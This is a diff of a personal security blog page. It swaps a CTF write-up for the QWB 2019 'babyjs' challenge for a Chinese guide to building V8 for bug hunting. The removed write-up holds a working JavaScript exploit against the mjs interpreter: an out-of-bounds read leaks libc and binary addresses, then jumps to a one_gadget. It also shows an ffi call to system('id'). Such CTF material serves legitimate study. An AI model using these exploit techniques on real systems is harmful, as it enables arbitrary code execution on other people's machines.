@@ -89,18 +89,18 @@
 
 
 
-<meta name="description" content="qwb2019_babyjs只是初略的复现了下… Proc: mjs MyEnvironmentGNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.18.04.1-Ubuntu 漏洞点 下标越界 1234567890x000555555780018-0x00055555556A2F0// get __libc">
+<meta name="description" content="V8环境搭建环境搭建配置git代理 1git config --global http.proxy http://proxyUsername:proxyPassword@proxy.server.com:port  在.zshrc中加入, 配置curl, wget等代理 12export http_proxy=&quot;http://ip:port/&quot;export https_proxy=$http_pr">
 <meta name="keywords" content="pwn,browser">
 <meta property="og:type" content="article">
-<meta property="og:title" content="qwb2019_babyjs">
-<meta property="og:url" content="https://q4n.github.io/2019/10/08/qwb2019_babyjs/index.html">
+<meta property="og:title" content="V8环境搭建">
+<meta property="og:url" content="https://q4n.github.io/2019/11/26/V8_Environ_Build/index.html">
 <meta property="og:site_name" content="Q4n&#39;s Blog">
-<meta property="og:description" content="qwb2019_babyjs只是初略的复现了下… Proc: mjs MyEnvironmentGNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.18.04.1-Ubuntu 漏洞点 下标越界 1234567890x000555555780018-0x00055555556A2F0// get __libc">
+<meta property="og:description" content="V8环境搭建环境搭建配置git代理 1git config --global http.proxy http://proxyUsername:proxyPassword@proxy.server.com:port  在.zshrc中加入, 配置curl, wget等代理 12export http_proxy=&quot;http://ip:port/&quot;export https_proxy=$http_pr">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-11-26T13:14:35.988Z">
+<meta property="og:updated_time" content="2019-11-26T13:14:36.104Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="qwb2019_babyjs">
-<meta name="twitter:description" content="qwb2019_babyjs只是初略的复现了下… Proc: mjs MyEnvironmentGNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.18.04.1-Ubuntu 漏洞点 下标越界 1234567890x000555555780018-0x00055555556A2F0// get __libc">
+<meta name="twitter:title" content="V8环境搭建">
+<meta name="twitter:description" content="V8环境搭建环境搭建配置git代理 1git config --global http.proxy http://proxyUsername:proxyPassword@proxy.server.com:port  在.zshrc中加入, 配置curl, wget等代理 12export http_proxy=&quot;http://ip:port/&quot;export https_proxy=$http_pr">
 
 
 
@@ -130,14 +130,14 @@
 
 
 
-  <link rel="canonical" href="https://q4n.github.io/2019/10/08/qwb2019_babyjs/">
+  <link rel="canonical" href="https://q4n.github.io/2019/11/26/V8_Environ_Build/">
 
 
 
 
 
 
-  <title>qwb2019_babyjs | Q4n's Blog</title>
+  <title>V8环境搭建 | Q4n's Blog</title>
   
 
 
@@ -264,7 +264,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://q4n.github.io/2019/10/08/qwb2019_babyjs/">
+    <link itemprop="mainEntityOfPage" href="https://q4n.github.io/2019/11/26/V8_Environ_Build/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Q4n">
@@ -281,7 +281,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">qwb2019_babyjs</h1>
+          <h1 class="post-title" itemprop="name headline">V8环境搭建</h1>
         
 
         <div class="post-meta">
@@ -293,8 +293,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-08T23:12:32+08:00">
-                2019-10-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-26T21:14:36+08:00">
+                2019-11-26
               </time>
             
 
@@ -312,8 +312,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/10/08/qwb2019_babyjs/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count gitment-comments-count" data-xid="/2019/10/08/qwb2019_babyjs/" itemprop="commentsCount"></span>
+                <a href="/2019/11/26/V8_Environ_Build/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2019/11/26/V8_Environ_Build/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -341,20 +341,27 @@
       
 
       
-        <h1 id="qwb2019-babyjs"><a href="#qwb2019-babyjs" class="headerlink" title="qwb2019_babyjs"></a>qwb2019_babyjs</h1><p>只是初略的复现了下…</p>
-<p>Proc: <a href="https://github.com/FlappyPig/QWB-2019/blob/master/babyjs/deploy/mjs" target="_blank" rel="noopener">mjs</a></p>
-<p>MyEnvironment<br><code>GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.</code><br><code>18.04.1-Ubuntu</code></p>
-<p>漏洞点 <code>下标越界</code></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x000555555780018</span><span class="number">-0x00055555556A2F0</span></span><br><span class="line"><span class="comment">// get __libc_free offset (libc)</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x000555555780018</span><span class="number">-0x00055555556A2F0</span></span><br><span class="line"><span class="comment">// get abort@plt offset (proc)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = ffi - ffi_addr + libc_base + <span class="number">0x10a38c</span>;</span><br><span class="line"><span class="comment">// ffi这个玩意-print(ffi)中显示的地址 + one_gadget</span></span><br><span class="line">a()();</span><br></pre></td></tr></table></figure>
+        <h1 id="V8环境搭建"><a href="#V8环境搭建" class="headerlink" title="V8环境搭建"></a>V8环境搭建</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>配置git代理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy http://proxyUsername:proxyPassword@proxy.server.com:port</span><br></pre></td></tr></table></figure>
 
-<p>EXP.JS</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o = &#123;<span class="attr">d</span>: ffi&#125;;</span><br><span class="line">print(o.d);</span><br><span class="line"><span class="comment">// get libc addr</span></span><br><span class="line"><span class="keyword">let</span> libc_addr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">7</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">  libc_addr = libc_addr &lt;&lt; <span class="number">8</span>;</span><br><span class="line">  libc_addr += o.d[<span class="number">0x215d28</span> + i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> libc_base = libc_addr - <span class="number">0x97950</span>;</span><br><span class="line">print(libc_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">// get binary addr</span></span><br><span class="line"><span class="keyword">let</span> bin_addr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">7</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">  bin_addr = bin_addr &lt;&lt; <span class="number">8</span>;</span><br><span class="line">  bin_addr += o.d[<span class="number">0x215d38</span> + i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bin_base = bin_addr - <span class="number">0x19a6</span>;</span><br><span class="line">print(bin_base);</span><br><span class="line"><span class="keyword">let</span> ffi_addr = bin_base + <span class="number">0x162f0</span>;</span><br><span class="line"><span class="keyword">let</span> a = ffi - ffi_addr + libc_base + <span class="number">0x10a38c</span>;</span><br><span class="line">print(a)</span><br><span class="line">a();</span><br></pre></td></tr></table></figure>
+<p>在<code>.zshrc</code>中加入, 配置curl, wget等代理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">"http://ip:port/"</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="variable">$http_proxy</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期?"></a>非预期?</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> system = ffi(<span class="string">"int system(char *)"</span>);</span><br><span class="line">print(system)</span><br><span class="line">system(<span class="string">"id"</span>);</span><br></pre></td></tr></table></figure>
+<p>安装<code>depot_tools</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH=$PATH:"/path/to/depot_tools"'</span> &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure>
 
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/5279" target="_blank" rel="noopener">https://xz.aliyun.com/t/5279</a></p>
-<p><a href="https://github.com/FlappyPig/QWB-2019/tree/master/babyjs" target="_blank" rel="noopener">https://github.com/FlappyPig/QWB-2019/tree/master/babyjs</a></p>
-<p><a href="http://dittozzz.top/2019/09/03/QWB2019-babyjs/" target="_blank" rel="noopener">http://dittozzz.top/2019/09/03/QWB2019-babyjs/</a></p>
+<p>安装<code>ninja</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ninja-build/ninja.git</span><br><span class="line"><span class="built_in">cd</span> ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH=$PATH:"/path/to/ninja"'</span> &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure>
+
+<p>编译v8</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">zsh</span><br><span class="line"><span class="comment"># 重新开一个zsh，这样新的环境变量才会被加载</span></span><br><span class="line">fetch v8</span><br><span class="line"><span class="comment"># 下载v8的repo，这个也是需要git代理才能成功下载的</span></span><br><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">git reset --hard [commit <span class="built_in">hash</span> with vulnerability]</span><br><span class="line"><span class="comment"># 如果编译最新版的话，就不用这行命令</span></span><br><span class="line"><span class="comment"># 如果是要调洞的话，就要在这里切到有漏洞的那个commit</span></span><br><span class="line">gclient sync</span><br><span class="line"><span class="comment"># gclient sync 用来下载一些其他需要的东西，</span></span><br><span class="line"><span class="comment"># 这个还需要curl的代理，之前也已经在环境变量配置了</span></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br><span class="line"><span class="comment"># 编译</span></span><br></pre></td></tr></table></figure>
+
+<p>release版本, 修改最后两行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C out.gn/x64.release</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mem2019.github.io/jekyll/update/2019/07/18/V8-Env-Config.html" target="_blank" rel="noopener">https://mem2019.github.io/jekyll/update/2019/07/18/V8-Env-Config.html</a></p>
+<p><a href="http://eternalsakura13.com/2018/05/06/v8/" target="_blank" rel="noopener">http://eternalsakura13.com/2018/05/06/v8/</a></p>
+<p><a href="http://eternalsakura13.com/2018/06/26/v8_environment/" target="_blank" rel="noopener">http://eternalsakura13.com/2018/06/26/v8_environment/</a></p>
 
       
     </div>
@@ -387,8 +394,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/02/35c3_Collection/" rel="next" title="35C3 CTF 2018 - collection">
-                <i class="fa fa-chevron-left"></i> 35C3 CTF 2018 - collection
+              <a href="/2019/11/26/redhad2019_offline_wp/" rel="next" title="redhad2019_offline">
+                <i class="fa fa-chevron-left"></i> redhad2019_offline
               </a>
             
           </div>
@@ -396,10 +403,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/10/09/bytectf2019_childjs/" rel="prev" title="bytectf2019_childjs">
-                bytectf2019_childjs <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -545,7 +548,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#qwb2019-babyjs"><span class="nav-number">1.</span> <span class="nav-text">qwb2019_babyjs</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#非预期"><span class="nav-number">1.1.</span> <span class="nav-text">非预期?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">1.2.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#V8环境搭建"><span class="nav-number">1.</span> <span class="nav-text">V8环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">1.2.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -739,7 +742,7 @@
       <script type="text/javascript">
       function renderGitment(){
         var gitment = new Gitmint({
-            id: '1570547552554', 
+            id: '1574774076092', 
             owner: 'Q4n',
             repo: 'Q4n.github.io',
             
